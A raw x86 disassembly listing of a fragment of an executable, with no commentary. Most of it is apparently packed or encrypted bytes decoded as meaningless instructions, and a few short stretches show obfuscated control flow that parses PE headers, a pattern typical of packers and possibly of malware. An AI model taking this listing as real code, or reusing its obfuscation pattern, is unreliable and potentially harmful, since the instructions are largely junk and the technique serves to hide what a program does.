  408d17:	inc    ebx
  408d18:	dec    ecx
  408d19:	test   eax,0x3b2bd878
  408d1e:	mov    eax,?
  408d20:	xchg   edx,eax
  408d21:	lods   eax,DWORD PTR ds:[esi]
  408d22:	inc    ebp
  408d23:	popa   
  408d24:	add    eax,0xbbfe0fe6
  408d29:	out    dx,al
  408d2a:	out    0xf4,al
  408d2c:	aaa    
  408d2d:	or     dh,BYTE PTR [edi]
  408d2f:	adc    DWORD PTR [eax],ebp
  408d31:	rcr    DWORD PTR [edi],cl
  408d33:	mov    eax,ds:0x2faff95d
  408d38:	jnp    0x408d81
  408d3a:	push   0xdaa32421
  408d3f:	je     0x408d1d
  408d41:	dec    ebp
  408d42:	and    al,0x88
  408d44:	sbb    DWORD PTR [ecx+eax*2],esi
  408d47:	imul   ecx,esi,0x293c014c
  408d4d:	lar    ebx,WORD PTR [eax-0x22]
  408d51:	into   
  408d52:	push   edx
  408d53:	and    dh,ah
  408d55:	mov    ah,0x8
  408d57:	push   0x3b4b8250
  408d5c:	cmp    BYTE PTR [esi-0x32700a94],bh
  408d62:	xchg   BYTE PTR [eax-0x57],dh
  408d65:	and    cl,BYTE PTR [esi+edi*4+0x3f]
  408d69:	or     al,0xbb
  408d6b:	jle    0x408d4f
  408d6d:	fisttp QWORD PTR [ebp+0x4c]
  408d70:	or     ebx,edx
  408d72:	or     esi,DWORD PTR [ebp-0xd698513]
  408d78:	add    ebp,eax
  408d7a:	cld    
  408d7b:	(bad)  
  408d7c:	(bad)  [eax-0x4]
  408d7f:	pusha  
  408d80:	add    al,0x59
  408d82:	aaa    
  408d83:	lock std 
  408d85:	sub    BYTE PTR ds:0x49fd0bad,bl
  408d8b:	inc    edi
  408d8c:	out    0x21,al
  408d8e:	cmp    BYTE PTR [eax],ch
  408d90:	push   0x56e30482
  408d95:	add    DWORD PTR [esi-0x7bbd5801],ecx
  408d9b:	clc    
  408d9c:	xor    DWORD PTR [esi+0x75],eax
  408d9f:	mov    DWORD PTR [edx-0x724a72c4],edi
  408da5:	xor    ebp,ebx
  408da7:	retf   0x79c0
  408daa:	sbb    eax,0x2b0c8b57
  408daf:	mov    bh,0x83
  408db1:	retf   
  408db2:	ret    
  408db3:	sahf   
  408db4:	push   cs
  408db5:	ftst   
  408db7:	xchg   edx,eax
  408db8:	jae    0x408dbd
  408dba:	adc    al,0x53
  408dbc:	cmp    ebx,DWORD PTR [ecx+0x3e]
  408dbf:	pop    ds
  408dc0:	jmp    0x55be:0xf9b5002f
  408dc7:	and    DWORD PTR [ecx-0x4dad0c2d],ebp
  408dcd:	mov    eax,0x64fc6804
  408dd2:	adc    eax,esi
  408dd4:	arpl   WORD PTR [ebx],bx
  408dd6:	jg     0x408d8d
  408dd8:	adc    DWORD PTR [ebx-0x41],edi
  408ddb:	(bad)  
  408ddc:	sbb    bh,dh
  408dde:	je     0x408e57
  408de0:	jnp    0x408e41
  408de2:	retf   0xc18e
  408de5:	jmp    0x408d7e
  408de7:	popf   
  408de8:	inc    esp
  408de9:	mov    edx,0xc6ee5f13
  408dee:	push   esp
  408def:	jmp    0xa7c0:0xa0c1c1de
  408df6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408df7:	call   0x33c1:0x900a3def
  408dfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dff:	adc    eax,0x2b0cd7fb
  408e04:	cmp    DWORD PTR [ebp-0x32],eax
  408e07:	stos   BYTE PTR es:[edi],al
  408e08:	lods   al,BYTE PTR ds:[esi]
  408e09:	push   ss
  408e0a:	add    BYTE PTR [esi+eiz*4-0x313d1486],al
  408e11:	sbb    edx,eax
  408e13:	stc    
  408e14:	cmp    al,0x36
  408e16:	mov    BYTE PTR [ebx],ch
  408e18:	mov    esi,0x7691bc32
  408e1d:	iret   
  408e1e:	gs pop ebp
  408e20:	mov    WORD PTR [eax-0x9],gs
  408e23:	fbstp  TBYTE PTR ds:0x458b6621
  408e29:	cld    
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0xd14e2f6a
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	adc    al,0x50
  408ec6:	push   ds
  408ec7:	and    BYTE PTR [esi+0x5a],dl
  408eca:	aaa    
  408ecb:	loopne 0x408e72
  408ecd:	aam    0x21
  408ecf:	stos   BYTE PTR es:[edi],al
  408ed0:	push   edx
  408ed1:	retf   0xbdbd
  408ed4:	jb     0x408f44
  408ed6:	shl    DWORD PTR [eax-0x21dcf931],cl
  408edc:	xchg   ecx,eax
  408edd:	jecxz  0x408e62
  408edf:	xchg   esp,eax
  408ee0:	jae    0x408e9a
  408ee2:	inc    edi
  408ee3:	test   DWORD PTR ds:0x6e30369a,0x80a4843e
  408eed:	sar    BYTE PTR [edx],1
  408eef:	jb     0x408edf
  408ef1:	mov    ebx,0x280ed7c0
  408ef6:	sbb    al,0x28
  408ef8:	pop    ecx
  408ef9:	jb     0x408ecd
  408efb:	pop    ecx
  408efc:	jecxz  0x408f24
  408efe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408eff:	mov    edx,0xc4d3af88
  408f04:	jmp    0xeee4:0xf41f1ad6
  408f0b:	or     ebx,DWORD PTR ds:0x586d9dd4
  408f11:	cmp    al,ch
  408f13:	mov    edi,0xc75abd83
  408f18:	rcl    BYTE PTR [ebx-0x2537d250],0x94
  408f1f:	xor    ebp,DWORD PTR [esp+edi*4-0x3054b6aa]
  408f26:	out    0xac,eax
  408f28:	sub    dh,cl
  408f2a:	xchg   ebx,eax
  408f2b:	add    ebx,DWORD PTR [edi-0x7ee4d942]
  408f31:	adc    al,0x28
  408f33:	add    eax,0x864fea2e
  408f38:	jmp    0x8449:0x50fe54dc
  408f3f:	aas    
  408f40:	mov    DWORD PTR [edx],edx
  408f42:	push   edx
  408f43:	sub    al,0x34
  408f45:	adc    ebx,ecx
  408f47:	mov    eax,ds:0xc4eb234b
  408f4c:	sar    DWORD PTR [edi+0x7351d624],1
  408f52:	jbe    0x408f7d
  408f54:	in     al,0xf8
  408f56:	pop    ds
  408f57:	in     eax,dx
  408f58:	repnz mov eax,ds:0xbd9cca58
  408f5e:	mov    eax,0x653c6acb
  408f63:	fwait
  408f64:	xor    BYTE PTR [ebx+0x42],dh
  408f67:	xor    al,0x8a
  408f69:	mov    cl,0xc9
  408f6b:	je     0x408faf
  408f6d:	sbb    esi,DWORD PTR [edx-0x73b1f9f5]
  408f73:	jo     0x408fa0
  408f75:	xor    bh,dh
  408f77:	cmp    DWORD PTR [edx],0x8df34ad
  408f7d:	sbb    eax,0x54f3c24
  408f82:	sbb    al,0xc0
  408f84:	in     eax,dx
  408f85:	jns    0x408f2f
  408f87:	jbe    0x408f56
  408f89:	xchg   al,bl
  408f8b:	repz mov bh,0x5c
  408f8e:	cwde   
  408f8f:	retf   
  408f90:	pop    ebx
  408f91:	dec    ecx
  408f92:	dec    edx
  408f93:	cdq    
  408f94:	cmp    ah,BYTE PTR [ecx+0x3e]
  408f97:	inc    esi
  408f98:	pop    esi
  408f99:	outs   dx,DWORD PTR ds:[esi]
  408f9a:	push   ebp
  408f9b:	xchg   esi,eax
  408f9c:	cmp    eax,0x633a0d58
  408fa1:	ins    BYTE PTR es:[edi],dx
  408fa2:	bound  esp,QWORD PTR [esi-0x2fdc9143]
  408fa8:	push   esi
  408fa9:	das    
  408faa:	pop    ebp
  408fab:	in     eax,0xa9
  408fad:	dec    ebx
  408fae:	mov    DWORD PTR [ebp-0x18],esi
  408fb1:	test   eax,0x7b1cac72
  408fb6:	aad    0x92
  408fb8:	aaa    
  408fb9:	xlat   BYTE PTR ds:[ebx]
  408fba:	sub    eax,eax
  408fbc:	pop    ds
  408fbd:	aaa    
  408fbe:	pop    eax
  408fbf:	pop    ecx
  408fc0:	sar    DWORD PTR [ebx+0x38],1
  408fc3:	adc    cl,BYTE PTR [edi+0x72]
  408fc6:	mov    WORD PTR [eax-0x9],fs
  408fc9:	jae    0x40903d
  408fcb:	mov    fs,WORD PTR [ecx-0x24d0d88e]
  408fd1:	sub    eax,0xb75b015f
  408fd6:	jge    0x408ff6
  408fd8:	popa   
  408fd9:	sbb    cl,bh
  408fdb:	out    0x97,al
  408fdd:	scas   al,BYTE PTR es:[edi]
  408fde:	push   edi
  408fdf:	js     0x408ff0
  408fe1:	(bad)  
  408fe3:	cs ja  0x40903c
  408fe6:	push   esp
  408fe7:	enter  0xd3ff,0x1f
  408feb:	bound  esi,QWORD PTR [edx-0x1]
  408fee:	ror    BYTE PTR [esi+eax*8+0x2b8bccd7],cl
  408ff5:	xor    dl,BYTE PTR [eax]
  408ff7:	stos   DWORD PTR es:[edi],eax
  408ff8:	call   0x7c9a9efc
  408ffd:	sbb    BYTE PTR [ebx],ah
  408fff:	xchg   DWORD PTR [eax+0x6e272d7f],esp
  409005:	popf   
  409006:	loope  0x409003
  409008:	out    dx,al
  409009:	sbb    eax,0x7895c4bf
  40900e:	in     al,0xf1
  409010:	pop    ss
  409011:	inc    ecx
  409012:	lods   al,BYTE PTR ds:[esi]
  409013:	rcl    cl,1
  409015:	fs in  eax,dx
  409017:	nop
  409018:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40901a:	jb     0x408fce
  40901c:	mov    ds:0xa301831e,eax
  409021:	cmp    al,BYTE PTR [ebp-0x4d8582b4]
  409027:	das    
  409028:	or     al,0x10
  40902a:	jle    0x408fbf
  40902c:	in     al,0x75
  40902e:	fidivr DWORD PTR [eax]
  409030:	mov    ebp,0x15763f50
  409035:	cmp    DWORD PTR [edi+0x1e],ebp
  409038:	add    bl,BYTE PTR [ebx+eax*1-0x4fddcb54]
  40903f:	(bad)  [edi]
  409041:	sar    DWORD PTR [ebp-0x7a],0x3a
  409045:	dec    edx
  409046:	fnsave [edi+0x68]
  409049:	sub    DWORD PTR [edx],0x92f0daa0
  40904f:	call   0x4bda:0x4c8fccf7
  409056:	mov    esp,0x58495327
  40905b:	push   ecx
  40905c:	pop    es
  40905d:	pop    eax
  40905e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40905f:	or     ebx,DWORD PTR [edx+edx*4-0x1c]
  409063:	jne    0x40904b
  409065:	into   
  409066:	xchg   dl,bl
  409068:	xchg   ebx,eax
  409069:	enter  0x5a99,0x8b
  40906d:	xor    eax,0x724515b5
  409072:	add    ecx,edx
  409074:	test   ch,dl
  409076:	sub    edi,esp
  409078:	push   eax
  409079:	cmp    ebp,ecx
  40907b:	xchg   ecx,eax
  40907c:	cs icebp 
  40907e:	call   0xda45c29
  409083:	xchg   ebx,eax
  409084:	in     eax,dx
  409085:	addr16 into 
  409087:	inc    eax
  409088:	call   0x1b819774
  40908d:	in     eax,0x2b
  40908f:	cmp    eax,0x6bac8180
  409094:	xchg   BYTE PTR [edi-0x25765e90],cl
  40909a:	(bad)  
  40909b:	mov    esi,0xd1db438c
  4090a0:	fdivr  st(7),st
  4090a2:	mov    ds:0x358105e4,eax
  4090a7:	sub    BYTE PTR [ecx+0x71],0xb5
  4090ab:	retf   0xb281
  4090ae:	push   es
  4090af:	jno    0x4090f4
  4090b1:	sub    al,BYTE PTR [esi]
  4090b3:	jne    0x4090ca
  4090b5:	adc    bh,ah
  4090b7:	fnsave [edx+0x1f799cbb]
  4090bd:	push   ds
  4090be:	mov    WORD PTR [ebx+0x74],ds
  4090c1:	or     esp,DWORD PTR [ecx]
  4090c3:	jmp    0xa682e139
  4090c8:	fwait
  4090c9:	inc    ecx
  4090ca:	mov    dh,0x27
  4090cc:	or     eax,0x353164a0
  4090d1:	leave  
  4090d2:	lods   eax,DWORD PTR ds:[esi]
  4090d3:	adc    ch,cl
  4090d5:	add    BYTE PTR [edi+0x6222aa2f],ah
  4090db:	rcr    al,cl
  4090dd:	scas   al,BYTE PTR es:[edi]
  4090de:	xchg   esp,eax
  4090df:	(bad)  
  4090e0:	mov    edi,0x5a75d316
  4090e5:	mov    fs,WORD PTR [edx]
  4090e7:	scas   eax,DWORD PTR es:[edi]
  4090e8:	fisub  DWORD PTR [edx]
  4090ea:	(bad)  
  4090ec:	sbb    DWORD PTR [ebp+0x33],0xffffffc6
  4090f0:	add    eax,edi
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0xbf
  409163:	fsub   DWORD PTR [edx]
  409165:	fs xor bl,bh
  409168:	jle    0x4091e8
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	sbb    al,0x5f
  409170:	or     ebx,edx
  409172:	loop   0x40917b
  409174:	xchg   ebp,eax
  409175:	sbb    eax,0xefbbe10
  40917a:	ss call 0x9f21:0x757fd6cd
  409182:	dec    esi
  409183:	push   0xe64bf186
  409188:	pop    ss
  409189:	adc    DWORD PTR [edx],esp
  40918b:	bound  eax,QWORD PTR [edi]
  40918d:	cli    
  40918e:	cvtpi2ps xmm5,QWORD PTR [esi]
  409191:	xlat   BYTE PTR ds:[ebx]
  409192:	call   DWORD PTR [eax+0x5e]
  409195:	jne    0x4091f1
  409197:	(bad)  
  409198:	mov    al,0xb6
  40919a:	sahf   
  40919b:	fsubr  DWORD PTR [esi+0x1a]
  40919e:	fldcw  WORD PTR [ecx+ecx*1-0x1eee73ea]
  4091a5:	and    ebp,DWORD PTR [esi]
  4091a7:	out    dx,al
  4091a8:	add    edx,ecx
  4091aa:	sub    eax,0x900d2b3a
  4091af:	or     DWORD PTR ds:0xf608e31e,edx
  4091b5:	xchg   edx,eax
  4091b6:	pushf  
  4091b7:	aaa    
  4091b8:	add    edx,ebp
  4091ba:	push   esp
  4091bb:	add    BYTE PTR [eax+ebp*1-0x35],cl
  4091bf:	cmp    esp,DWORD PTR [edx+0x28]
  4091c2:	xchg   ebx,eax
  4091c3:	pushf  
  4091c4:	push   edx
  4091c5:	xchg   edi,eax
  4091c6:	add    DWORD PTR [ecx+0x165f85d1],eax
  4091cc:	pop    ebp
  4091cd:	ret    
  4091ce:	pop    edx
  4091cf:	sbb    DWORD PTR [esi-0x117c9386],esi
  4091d5:	iret   
  4091d6:	inc    edi
  4091d7:	cmp    DWORD PTR [ebx],edi
  4091d9:	dec    eax
  4091da:	(bad)
  4091de:	fld    st(7)
  4091e0:	mov    cl,0xda
  4091e2:	arpl   WORD PTR [esi+0x330c055c],si
  4091e8:	or     eax,0x60debb18
  4091ed:	cld    
  4091ee:	fadd   QWORD PTR [esi-0xc]
  4091f1:	es aam 0xdc
  4091f4:	leave  
  4091f5:	das    
  4091f6:	(bad)  
  4091f8:	lods   al,BYTE PTR ds:[esi]
  4091f9:	add    BYTE PTR [ecx-0x5fc3f6e0],bh
  4091ff:	test   eax,0x1ee26dd1
  409204:	mov    WORD PTR [edi-0xd],?
  409207:	ds retf 0xe5c3
  40920b:	dec    esp
  40920c:	cmc    
  40920d:	fbstp  TBYTE PTR ds:0xe6496f48
  409213:	adc    esi,ecx
  409215:	je     0x409286
  409217:	out    0xdf,al
  409219:	xlat   BYTE PTR ds:[ebx]
  40921a:	push   ecx
  40921b:	dec    ecx
  40921c:	mov    ecx,0x8efd8686
  409221:	add    esi,esi
  409223:	or     al,0x6
  409225:	fild   DWORD PTR [edx]
  409227:	stos   DWORD PTR es:[edi],eax
  409228:	inc    ebx
  409229:	repz repz cmp eax,0x6dad3841
  409230:	imul   esp,DWORD PTR [edi+eiz*2-0x3c],0xb5b8274
  409238:	test   al,0x1b
  40923a:	lods   al,BYTE PTR ds:[esi]
  40923b:	and    ch,BYTE PTR ds:0xfaa538cf
  409241:	(bad)  
  409242:	adc    dl,BYTE PTR [eax]
  409244:	fdiv   QWORD PTR [ecx]
  409246:	jecxz  0x409269
  409248:	(bad)  
  409249:	fldenv [esi+0x2e]
  40924c:	lock adc BYTE PTR [edx+0x2523c4b8],bl
  409253:	leave  
  409254:	sbb    eax,ebp
  409256:	les    edx,FWORD PTR [edi+0x24]
  409259:	add    eax,0xceea98e8
  40925e:	fadd   DWORD PTR [edi-0x73be8f97]
  409264:	dec    eax
  409265:	push   edx
  409266:	cmp    eax,0xd145bbd6
  40926b:	es in  al,0xfe
  40926e:	xchg   esp,eax
  40926f:	(bad)  [ecx+0x54]
  409272:	mov    ?,edi
  409274:	mov    ds:0xe2e57d75,eax
  409279:	inc    edx
  40927a:	ins    DWORD PTR es:[edi],dx
  40927b:	jmp    0x4092a9
  40927d:	test   al,0xf0
  40927f:	sbb    DWORD PTR ds:0x9e2f6675,0xffffff90
  409286:	push   ecx
  409287:	mov    ch,0xe
  409289:	test   BYTE PTR [esi-0xad4477],0xad
  409290:	sbb    cl,BYTE PTR [edi]
  409292:	or     cl,BYTE PTR [eax-0x5b]
  409295:	rcl    DWORD PTR [ebp+0x61],cl
  409298:	mov    WORD PTR [esi],ds
  40929a:	xchg   BYTE PTR [eax],al
  40929c:	cli    
  40929d:	sbb    eax,0x91404a20
  4092a2:	adc    eax,0xde535750
  4092a7:	jecxz  0x40929d
  4092a9:	lea    eax,[edx-0x6a]
  4092ac:	outs   dx,DWORD PTR ds:[esi]
  4092ad:	and    al,BYTE PTR [ebx]
  4092af:	jl     0x4092dd
  4092b1:	dec    ebx
  4092b2:	sub    DWORD PTR [esi],0x64
  4092b5:	hlt    
  4092b6:	mov    edx,DWORD PTR [ebx]
  4092b8:	add    bh,BYTE PTR [esi]
  4092ba:	and    BYTE PTR [edi],bl
  4092bc:	fwait
  4092bd:	jo     0x4092ba
  4092bf:	xchg   ecx,eax
  4092c0:	ror    DWORD PTR [edi],0xdf
  4092c3:	out    0xf3,eax
  4092c5:	sub    al,0x90
  4092c7:	add    DWORD PTR [esi],esi
  4092c9:	inc    esi
  4092ca:	sbb    ecx,DWORD PTR [ebp+eax*1-0x2385e6a9]
  4092d1:	std    
  4092d2:	scas   eax,DWORD PTR es:[edi]
  4092d3:	mov    dh,0xb1
  4092d5:	add    ah,BYTE PTR [esi+eiz*1+0x7f]
  4092d9:	inc    edi
  4092da:	ins    DWORD PTR es:[edi],dx
  4092db:	iret   
  4092dc:	je     0x409282
  4092de:	adc    eax,0x5d9f7ae7
  4092e3:	mov    al,0x82
  4092e5:	jmp    0xf24fa38c
  4092ea:	cs cmp dh,ch
  4092ed:	pop    es
  4092ee:	enter  0x6431,0x2e
  4092f2:	adc    eax,0x36a0741f
  4092f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092f8:	(bad)  
  4092f9:	call   FWORD PTR [edx-0x5d]
  4092fc:	fsub   DWORD PTR [esi-0x5c]
  4092ff:	js     0x4092bf
  409301:	fs mov eax,0x897d48ba
  409307:	push   ds
  409308:	std    
  409309:	cmp    DWORD PTR [ecx],ecx
  40930b:	or     ebp,ebp
  40930d:	in     al,0x28
  40930f:	dec    eax
  409310:	data16 adc al,0xa6
  409313:	loopne 0x4092bc
  409315:	xchg   ebx,eax
  409316:	mov    BYTE PTR [ecx],ah
  409318:	add    al,0x6f
  40931a:	xlat   BYTE PTR ds:[ebx]
  40931b:	inc    esi
  40931c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40931d:	mov    al,0x4b
  40931f:	or     DWORD PTR [edi],edi
  409321:	mov    bh,0xa1
  409323:	test   al,0x8f
  409325:	xor    bh,BYTE PTR [ebp+edx*4-0x3ce66e5b]
  40932c:	fsubr  QWORD PTR [edx+0x37]
  40932f:	scas   al,BYTE PTR es:[edi]
  409330:	scas   al,BYTE PTR es:[edi]
  409331:	je     0x4093a5
  409333:	js     0x4092da
  409335:	loopne 0x4093a1
  409337:	pop    edi
  409338:	push   edx
  409339:	repnz sub cl,dh
  40933c:	lds    eax,FWORD PTR [esi-0x6c]
  40933f:	fld    QWORD PTR [esi]
  409341:	mov    edi,0xcb1080db
  409346:	jno    0x409313
  409348:	jmp    0x409335
  40934a:	xchg   BYTE PTR [edx-0x4a],ah
  40934d:	fiadd  WORD PTR [eax+0x7e6bd819]
  409353:	inc    esi
  409354:	inc    edx
  409355:	add    DWORD PTR [ebp+0xe2c38d4],esp
  40935b:	add    eax,eax
  40935d:	sub    DWORD PTR [esp+ebp*4+0x297eace5],0x41
  409365:	loop   0x4093a2
  409367:	pop    esp
  409368:	pop    ss
  409369:	jns    0x4093a3
  40936b:	mov    esi,0x12d33e1f
  409370:	rcr    BYTE PTR [edx-0x5b11af2e],0x1b
  409377:	popa   
  409378:	test   eax,0x35a9280c
  40937d:	imul   BYTE PTR [edx+0x20]
  409380:	dec    esp
  409381:	es mov cl,0x22
  409384:	and    DWORD PTR [ecx-0x52d7aac],edi
  40938a:	fstp   TBYTE PTR [edi-0x5b]
  40938d:	(bad)  
  40938e:	popa   
  40938f:	iret   
  409390:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409391:	dec    ebp
  409392:	ret    0xbc56
  409395:	adc    DWORD PTR [ebx+ecx*8+0x458b0889],ecx
  40939c:	or     al,0x8b
  40939e:	inc    ebp
  40939f:	or     bh,bh
  4093a1:	jne    0x40939b
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	mov    BYTE PTR [esi-0x78],al
  4093b7:	pop    eax
  4093b8:	fcomp  st(5)
  4093ba:	jle    0x40943a
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	fcom   QWORD PTR [eax+ecx*4]
  4093c3:	xor    eax,0xdae86acb
  4093c8:	cs and al,0x81
  4093cb:	(bad)  
  4093cc:	mov    ch,0x8e
  4093ce:	dec    esp
  4093cf:	mov    ds:0xb6af40e,al
  4093d4:	add    dh,BYTE PTR [esi-0x7ac22b4c]
  4093da:	or     DWORD PTR [ecx],edi
  4093dc:	inc    ecx
  4093dd:	scas   eax,DWORD PTR es:[edi]
  4093de:	out    0x36,eax
  4093e0:	outs   dx,DWORD PTR ds:[esi]
  4093e1:	xchg   edx,eax
  4093e2:	push   esp
  4093e3:	or     DWORD PTR [edx],esp
  4093e5:	xchg   esp,eax
  4093e6:	iret   
  4093e7:	not    bl
  4093e9:	or     eax,0xf5def0b8
  4093ee:	ins    DWORD PTR es:[edi],dx
  4093ef:	mov    dh,BYTE PTR [edi-0x70]
  4093f2:	mov    ebx,0x262c571c
  4093f7:	fstp   QWORD PTR [eax]
  4093f9:	test   eax,0x22f3df01
  4093fe:	mov    ds:0xda40a26,al
  409403:	sahf   
  409404:	out    0x19,al
  409406:	jae    0x4093eb
  409408:	adc    eax,0x35398973
  40940d:	out    dx,al
  40940e:	xor    dh,bh
  409410:	arpl   WORD PTR [ebp+0x6771b79e],dx
  409416:	mov    al,0x6a
  409418:	fsubr  st,st(6)
  40941a:	jns    0x409451
  40941c:	jmp    0x1d86b049
  409421:	ret    
  409422:	pushf  
  409423:	xchg   edi,eax
  409424:	pop    eax
  409425:	pop    edi
  409426:	or     al,0xf6
  409428:	out    dx,al
  409429:	mov    edx,0x3f6a067a
  40942e:	xor    eax,0x27af280a
  409433:	rol    DWORD PTR [edi-0x69],1
  409436:	jmp    FWORD PTR [edi]
  409438:	icebp  
  409439:	lds    edi,FWORD PTR [esi]
  40943b:	fsubr  QWORD PTR [esi+edx*1-0x7]
  40943f:	out    dx,eax
  409440:	loopne 0x409490
  409442:	push   es
  409443:	xchg   esp,eax
  409444:	loop   0x40945a
  409446:	popa   
  409447:	ret    
  409448:	mov    bh,BYTE PTR [eax-0x6e8012a7]
  40944e:	mov    dh,0xf3
  409450:	adc    eax,0xb5f2108a
  409455:	or     bl,BYTE PTR [edi]
  409457:	scas   eax,DWORD PTR es:[edi]
  409458:	push   ss
  409459:	sub    DWORD PTR [ecx],esp
  40945b:	push   ss
  40945c:	mov    ds:0x38c50377,eax
  409461:	fmulp  st(4),st
  409463:	cld    
  409464:	mov    al,ds:0xf05f8bbe
  409469:	adc    dh,BYTE PTR [esi-0x5b]
  40946c:	mov    ebx,0xc7fc7d04
  409471:	test   BYTE PTR [edx],dl
  409473:	not    DWORD PTR [eax-0x17b42227]
  409479:	xchg   ebp,eax
  40947a:	add    bx,WORD PTR [ebp+0x44]
  40947e:	mov    ebp,0xf00b7440
  409483:	jp     0x409495
  409485:	ror    dh,1
  409487:	cwde   
  409488:	fninit 
  40948a:	das    
  40948b:	mov    al,bh
  40948d:	aas    
  40948e:	scas   eax,DWORD PTR es:[edi]
  40948f:	(bad)  
  409490:	icebp  
  409491:	std    
  409492:	test   BYTE PTR [ecx+0x6e47471b],dl
  409498:	pop    ebp
  409499:	js     0x4094b7
  40949b:	mov    bh,0xd5
  40949d:	je     0x4094cd
  40949f:	imul   edx,DWORD PTR [ecx-0x74acc4ed],0x5c929d87
  4094a9:	iret   
  4094aa:	dec    edx
  4094ab:	pop    ds
  4094ac:	sbb    DWORD PTR [edx],ecx
  4094ae:	or     bl,BYTE PTR [edx+edx*1-0x63]
  4094b2:	jne    0x40945d
  4094b4:	dec    ecx
  4094b5:	arpl   WORD PTR [ebx+0x65],cx
  4094b8:	jge    0x4094da
  4094ba:	and    eax,0x6fd2e392
  4094bf:	fmul   QWORD PTR [ebx+0x481da09e]
  4094c5:	or     eax,0xa904dd73
  4094ca:	or     eax,0x59f08de2
  4094cf:	pop    esi
  4094d0:	add    ebp,DWORD PTR [ebx-0x1a]
  4094d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094d4:	jp     0x4094a8
  4094d6:	lds    esp,FWORD PTR [edi-0x39fd036f]
  4094dc:	inc    edx
  4094dd:	mov    si,0x6e29
  4094e1:	lods   eax,DWORD PTR ds:[esi]
  4094e2:	clc    
  4094e3:	pop    edi
  4094e4:	or     bl,BYTE PTR [eax]
  4094e6:	shr    BYTE PTR [esi],cl
  4094e8:	xchg   ebp,eax
  4094e9:	repz inc edi
  4094eb:	jbe    0x409471
  4094ed:	sub    al,0xc8
  4094ef:	std    
  4094f0:	shl    bh,1
  4094f2:	push   esi
  4094f3:	hlt    
  4094f4:	push   ebp
  4094f5:	nop
  4094f6:	bound  ebp,QWORD PTR [ebp+0x3d]
  4094f9:	jp     0x409577
  4094fb:	and    eax,0x71
  4094fe:	sar    edi,0xe3
  409501:	jne    0x409576
  409503:	xchg   ebx,eax
